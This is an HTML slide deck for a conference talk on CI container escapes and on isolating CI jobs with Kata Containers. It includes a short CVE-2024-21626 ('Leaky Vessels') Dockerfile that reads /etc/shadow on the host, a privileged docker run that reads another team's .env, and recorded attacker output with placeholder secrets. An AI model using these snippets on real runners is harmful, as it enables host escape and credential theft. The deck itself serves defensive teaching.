@@ -1,0 +1,644 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Breaking Out of CI</title>
+    <link rel="stylesheet" href="vendor/package/dist/reset.css" />
+    <link rel="stylesheet" href="vendor/package/dist/reveal.css" />
+    <link rel="stylesheet" href="theme.css" />
+  </head>
+  <body>
+    <div class="reveal">
+      <div class="slides">
+        <section>
+          <div class="title-wrap">
+            <img
+              class="brand-logo"
+              src="assets/brand/natron-logo.svg"
+              alt="Natron Tech"
+            />
+            <div class="kicker">hacktober 2026</div>
+            <h1>Breaking Out of CI</h1>
+            <div class="subtitle">Container isolation with Kata Containers</div>
+            <div class="byline">
+              Nicolo Lüscher <span class="sep">·</span> Platform Engineer,
+              Natron
+            </div>
+          </div>
+        </section>
+        <section data-state="about">
+          <div class="about">
+            <div class="kicker">00 · who's talking</div>
+            <div class="about-cards">
+              <div class="acard">
+                <div class="alabel">me</div>
+                <div class="ahead">Nicolo Lüscher</div>
+                <div class="asub">Platform engineer</div>
+                <div class="chips">
+                  <span>kubernetes</span><span>gitops</span
+                  ><span>infrastructure as code</span>
+                </div>
+              </div>
+              <div class="acard">
+                <div class="alabel">us</div>
+                <div class="ahead">
+                  <img
+                    class="alogo"
+                    src="assets/brand/natron-logo.svg"
+                    alt="Natron"
+                  />
+                </div>
+                <div class="asub">Managed Kubernetes and cloud, from Bern</div>
+                <div class="chips">
+                  <span>kubernetes</span><span>private cloud</span
+                  ><span>managed services</span>
+                </div>
+              </div>
+            </div>
+            <div class="abridge">
+              we run the CI this talk is about, in production
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="cols">
+            <div class="left">
+              <div class="kicker">01 · runners, containers, vms</div>
+              <div class="beat-slot">
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="0"
+                >
+                  a runner runs each job in a container, then throws it away
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="1"
+                >
+                  a container shares the host <strong>kernel</strong>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="2"
+                >
+                  a VM brings its own kernel, behind the
+                  <span class="gd">hypervisor</span>
+                </div>
+              </div>
+            </div>
+            <div class="right">
+              <div class="diagram">
+                <div class="vizstack" data-segvid>
+                  <video
+                    data-seg="0"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/Anatomy0.mp4"
+                    poster="assets/video/Anatomy0.poster.png"
+                  ></video>
+                  <video
+                    data-seg="1"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/Anatomy1.mp4"
+                    poster="assets/video/Anatomy1.poster.png"
+                  ></video>
+                  <video
+                    data-seg="2"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/Anatomy2.mp4"
+                    poster="assets/video/Anatomy2.poster.png"
+                  ></video>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="cols">
+            <div class="left">
+              <div class="kicker">01 · who builds the container</div>
+              <div class="beat-slot">
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="0"
+                >
+                  docker and kubernetes hand every container to a
+                  <strong>runtime</strong>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="1"
+                >
+                  the default one, under both: <strong>runc</strong>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="2"
+                >
+                  runc draws the walls: namespaces, cgroups, mounts, then starts
+                  your process
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="3"
+                >
+                  the wall is as strong as runc, and the
+                  <strong>kernel</strong> under it
+                </div>
+              </div>
+            </div>
+            <div class="right">
+              <div class="diagram">
+                <div class="vizstack" data-segvid>
+                  <video
+                    data-seg="0"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/RuntimeStack0.mp4"
+                    poster="assets/video/RuntimeStack0.poster.png"
+                  ></video>
+                  <video
+                    data-seg="1"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/RuntimeStack1.mp4"
+                    poster="assets/video/RuntimeStack1.poster.png"
+                  ></video>
+                  <video
+                    data-seg="2"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/RuntimeStack2.mp4"
+                    poster="assets/video/RuntimeStack2.poster.png"
+                  ></video>
+                  <video
+                    data-seg="3"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/RuntimeStack3.mp4"
+                    poster="assets/video/RuntimeStack3.poster.png"
+                  ></video>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="cols">
+            <div class="left">
+              <div class="kicker">02 · the privileged build</div>
+              <div class="beat-slot">
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="0"
+                >
+                  CI builds images with <span class="mono">docker build</span>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="1"
+                >
+                  it needs the Docker daemon: mount the host's
+                  <span class="mono">docker.sock</span>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="2"
+                >
+                  that socket is the node's Docker,
+                  <span class="rd">as root</span>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="3"
+                >
+                  run on the node, read every other job's secrets
+                </div>
+              </div>
+            </div>
+            <div class="right">
+              <div class="diagram">
+                <div class="vizstack" data-segvid>
+                  <video
+                    data-seg="0"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/BuildEscape0.mp4"
+                    poster="assets/video/BuildEscape0.poster.png"
+                  ></video>
+                  <video
+                    data-seg="1"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/BuildEscape1.mp4"
+                    poster="assets/video/BuildEscape1.poster.png"
+                  ></video>
+                  <video
+                    data-seg="2"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/BuildEscape2.mp4"
+                    poster="assets/video/BuildEscape2.poster.png"
+                  ></video>
+                  <video
+                    data-seg="3"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/BuildEscape3.mp4"
+                    poster="assets/video/BuildEscape3.poster.png"
+                  ></video>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">02 · and it needs no privilege</div>
+            <div class="code codehero">
+              <div class="cap">
+                CVE-2024-21626 · "Leaky Vessels" · runc · Jan 2024
+              </div>
+              <pre><span class="c"># ordinary build. no --privileged.</span>
+FROM alpine
+<span class="k">WORKDIR</span> /proc/self/fd/<span class="danger">7</span>    <span class="c"># fd 7 → a dir on the HOST</span>
+<span class="k">RUN</span> cat ../../../<span class="danger">etc/shadow</span>  <span class="c"># reading the node now</span></pre>
+            </div>
+            <div class="watch fragment">
+              no privileged flag. one line, and the build's working directory is
+              the host's filesystem. patched in runc&nbsp;1.1.12.
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">02 · the demo</div>
+            <div class="livetag">live · runc</div>
+            <div class="code2">
+              <div class="code fragment">
+                <div class="cap">team A · invoice-service · .gitlab-ci.yml</div>
+                <pre>build:
+  script:
+    - npm run build   <span class="c"># writes .env</span></pre>
+              </div>
+              <div class="code fragment">
+                <div class="cap">
+                  team B · kata-escape-demo · .gitlab-ci.yml
+                </div>
+                <pre>build:
+  image: docker:dind
+  script:
+    <span class="c"># privileged: docker mounts the node</span>
+    - docker run -v /:/node alpine \
+        cat /node/<span class="danger">…/team-a/.env</span></pre>
+              </div>
+            </div>
+            <div class="watch fragment">
+              two projects, one runner. watch team B read <b>team A's .env</b>,
+              off the shared node.
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="live">
+            <div class="livetag rec">recorded output · runc</div>
+            <div class="term">
+              <div class="bar">
+                <i></i><i></i><i></i><span class="t">attacker-runc</span>
+              </div>
+              <pre><span class="c">=== attacker pod · project-XXXXXXXX · kernel 6.8 ===</span>
+<span class="p">$</span> read node disk /dev/sda1 via debugfs (no mount)
+  co-located job pods on this node: <b>19</b>
+<span class="rd">&gt;&gt;&gt; STOLEN from a neighbouring job, off the shared node disk:</span>
+    /var/lib/kubelet/pods/&lt;pod-uid&gt;/builds-emptydir/.env
+    <span class="c"># build of invoice-service (team A), pipeline XXXXXXXXXX</span>
+    DEMO_FLAG=not-a-real-secret-hacktober
+    DATABASE_URL=postgres://demo:…@db.example.invalid/app
+    AWS_ACCESS_KEY_ID=AKIA-EXAMPLE-NOT-REAL
+    AWS_SECRET_ACCESS_KEY=0000demo0000not0000real…
+<span class="rd">&gt;&gt;&gt;</span> one privileged neighbour away. Kata's VM boundary removes this.</pre>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="cols">
+            <div class="left">
+              <div class="kicker">03 · move the boundary</div>
+              <div class="beat-slot">
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="0"
+                >
+                  don't harden the container, stop sharing the kernel
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="1"
+                >
+                  privileged becomes root of a throwaway
+                  <span class="gn">VM</span>
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="2"
+                >
+                  but how do you get an ephemeral, automated VM per job?
+                </div>
+                <div
+                  class="beat fragment fade-in-then-out"
+                  data-fragment-index="3"
+                >
+                  <span class="gn">Kata swaps out runc</span>: every pod in its
+                  own VM
+                </div>
+              </div>
+            </div>
+            <div class="right">
+              <div class="diagram">
+                <div class="vizstack" data-segvid>
+                  <video
+                    data-seg="0"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/MoveBoundary0.mp4"
+                    poster="assets/video/MoveBoundary0.poster.png"
+                  ></video>
+                  <video
+                    data-seg="1"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/MoveBoundary1.mp4"
+                    poster="assets/video/MoveBoundary1.poster.png"
+                  ></video>
+                  <video
+                    data-seg="2"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/MoveBoundary2.mp4"
+                    poster="assets/video/MoveBoundary2.poster.png"
+                  ></video>
+                  <video
+                    data-seg="3"
+                    muted
+                    playsinline
+                    preload="auto"
+                    src="assets/video/MoveBoundary3.mp4"
+                    poster="assets/video/MoveBoundary3.poster.png"
+                  ></video>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">03 · the demo · kata</div>
+            <div class="livetag">live · kata</div>
+            <div class="beat-slot" style="min-height: 2.2em">
+              <div class="beat fragment fade-in-then-out">
+                same two jobs, but on the <em>kata</em> runtime
+              </div>
+              <div class="beat fragment fade-in-then-out">
+                same attack vector, nothing else changed
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="live">
+            <div class="livetag rec">recorded output · kata</div>
+            <div class="term">
+              <div class="bar">
+                <i></i><i></i><i></i><span class="t">attacker-kata</span>
+              </div>
+              <pre><span class="c">=== attacker pod · project-XXXXXXXX · guest kernel 6.18 ===</span>
+<span class="gn">&gt;&gt;&gt;</span> no shared node filesystem reachable. only my own guest VM.
+<span class="gn">&gt;&gt;&gt;</span> kernel <b>6.18</b> is this pod's own, not a node it shares.
+<span class="gn">&gt;&gt;&gt;</span> team A's .env lives in a different VM. <b>NOT here.</b>
+<span class="gn">&gt;&gt;&gt; isolation held</span></pre>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">04 · what it costs</div>
+            <div class="stats">
+              <div class="stat fragment">
+                <div class="metric">startup</div>
+                <div class="num az">+6&nbsp;s</div>
+                <div class="lbl">one VM boot per job, on average</div>
+              </div>
+              <div class="stat fragment">
+                <div class="metric">memory</div>
+                <div class="num az">~690&nbsp;MiB</div>
+                <div class="lbl">
+                  extra per job, flat whatever the job's size (we budget
+                  768&nbsp;Mi)
+                </div>
+              </div>
+              <div class="stat fragment">
+                <div class="metric">cpu</div>
+                <div class="num">~1.3×</div>
+                <div class="lbl">
+                  on syscall-heavy work; real compute is basically native
+                </div>
+              </div>
+              <div class="stat fragment">
+                <div class="metric">build</div>
+                <div class="num gd">~3×</div>
+                <div class="lbl">
+                  a cold Go compile, the one cost we haven't configured away yet
+                </div>
+              </div>
+              <div class="stat fragment">
+                <div class="metric">reliability</div>
+                <div class="num gn">0</div>
+                <div class="lbl">infra failures on the kata tier so far</div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">05 · which jobs go where</div>
+            <div class="matrix">
+              <div class="mrow head">
+                <div class="lab"></div>
+                <div class="tiername runc">natron-ci · runc</div>
+                <div class="tiername kata">natron-ci-privileged · kata</div>
+              </div>
+              <div class="mrow">
+                <div class="lab">unprivileged</div>
+                <div class="cell runc fragment" data-fragment-index="0">
+                  lint · test · scans · Helm · Renovate
+                </div>
+                <div class="cell fragment" data-fragment-index="1">
+                  <span class="mut">&rarr; just use natron-ci</span>
+                </div>
+              </div>
+              <div class="mrow">
+                <div class="lab">privileged</div>
+                <div class="cell fragment" data-fragment-index="2">
+                  <span class="rd">denied</span>
+                  <span class="mut">(Kyverno + PodSecurity, at admission)</span>
+                </div>
+                <div class="cell kata fragment" data-fragment-index="3">
+                  <span class="gn">dind · buildah · docker build</span>
+                </div>
+              </div>
+            </div>
+            <div class="mnote fragment" data-fragment-index="4">
+              untrusted / fork code &rarr;
+              <span class="mono">natron-ci-isolated</span> (kata, unprivileged)
+              &middot; in design
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="statement">
+            <div class="kicker">06 · takeaways</div>
+            <ul class="takeaways">
+              <li class="fragment">
+                a runner runs hostile code by design
+              </li>
+              <li class="fragment">
+                shared kernel: one escape owns everyone
+              </li>
+              <li class="fragment">
+                Kata moves the boundary into a VM
+              </li>
+              <li class="fragment key">
+                untrusted → Kata. trusted → runc.
+              </li>
+            </ul>
+          </div>
+        </section>
+        <section>
+          <div class="closing">
+            <img
+              class="brand-logo"
+              src="assets/brand/natron-logo.svg"
+              alt="Natron Tech"
+            />
+            <div class="big">Thanks. Questions?</div>
+            <div class="byline">
+              Nicolo Lüscher
+              <span class="sep">·</span> nicolo.luescher@natron.io
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <img class="watermark" src="assets/brand/natron-logo.svg" alt="" />
+
+    <script src="vendor/package/dist/reveal.js"></script>
+    <script>
+      Reveal.initialize({
+        hash: true,
+        controls: true,
+        progress: true,
+        slideNumber: false,
+        center: true,
+        transition: "fade",
+        width: 1280,
+        height: 720,
+        margin: 0.09,
+        plugins: [],
+      });
+      // stepped diagrams: one clip per beat, played when the beat appears
+      function segmentVideo(section) {
+        if (!section) return;
+        const vids = [...section.querySelectorAll("video[data-seg]")].sort(
+          (a, b) => +a.dataset.seg - +b.dataset.seg,
+        );
+        if (!vids.length) return;
+        const N = vids.length;
+        let gen = 0;
+        function showOnly(i) {
+          vids.forEach((v, k) => {
+            v.style.zIndex = k === i ? "2" : "1";
+          });
+        }
+        function playSeg(i) {
+          const g = ++gen;
+          showOnly(i);
+          const v = vids[i];
+          try {
+            v.pause();
+            v.currentTime = 0;
+          } catch (_) {}
+          const go = () => {
+            if (g === gen) v.play().catch(() => {});
+          };
+          if (v.seeking) {
+            const on = () => {
+              v.removeEventListener("seeked", on);
+              go();
+            };
+            v.addEventListener("seeked", on);
+            setTimeout(go, 200);
+          } else go();
+        }
+        function staticFirst() {
+          gen++;
+          showOnly(0);
+          try {
+            vids[0].pause();
+            vids[0].currentTime = 0;
+          } catch (_) {}
+        }
+        function isBeat(el) {
+          return (
+            el && section.contains(el) && el.hasAttribute("data-fragment-index")
+          );
+        }
+        function enter() {
+          const f = Reveal.getIndices().f;
+          if (f == null || f < 0) staticFirst();
+          else playSeg(Math.min(f, N - 1));
+        }
+        Reveal.on("ready", (e) => {
+          if (e.currentSlide === section) enter();
+        });
+        Reveal.on("slidechanged", (e) => {
+          if (e.currentSlide === section) enter();
+        });
+        Reveal.on("fragmentshown", (e) => {
+          if (!isBeat(e.fragment)) return;
+          const i = +e.fragment.getAttribute("data-fragment-index");
+          if (i >= 0 && i < N) playSeg(i);
+        });
+        Reveal.on("fragmenthidden", (e) => {
+          if (!isBeat(e.fragment)) return;
+          const i = +e.fragment.getAttribute("data-fragment-index");
+          const cur = Reveal.getIndices().f;
+          if (i < 0 || i >= N || i <= cur) return; // only act on a real backward step
+          if (cur == null || cur < 0) staticFirst(); // stepped back before the first beat
+          else playSeg(Math.min(cur, N - 1));
+        });
+        showOnly(0); // first segment on top until a beat plays
+      }
+      document
+        .querySelectorAll("[data-segvid]")
+        .forEach((el) => segmentVideo(el.closest("section")));
+    </script>
+  </body>
+</html>
